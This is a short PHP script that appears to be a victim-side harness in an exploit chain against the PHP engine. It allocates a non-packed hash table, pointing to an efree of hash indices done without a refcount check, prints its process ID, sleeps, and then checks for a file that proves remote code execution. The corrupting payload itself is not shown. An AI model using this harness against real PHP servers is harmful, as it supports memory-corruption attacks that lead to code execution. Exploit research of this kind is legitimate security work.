<?php
header("Content-Type: text/plain");
$pid = getmypid();
echo "PID: $pid\n";
echo "PHASE: allocating\n";

// String keys force non-packed HashTable (has hash indices area at allocation start)
// This is critical: hash indices area is efree'd WITHOUT refcount check
$data = [];
for ($i = 0; $i < 20; $i++) {
    $data["key_$i"] = str_repeat(chr(65 + ($i % 26)), 24);
}

echo "PHASE: sleeping\n";
echo "ALLOC_COUNT: 20\n";
flush();
sleep(30);

echo "PHASE: wakeup\n";
echo "ALIVE: yes\n";
$check = file_exists("/tmp/chain_d_rce_proof");
echo "RCE_PROOF: " . ($check ? "FOUND" : "not_found") . "\n";
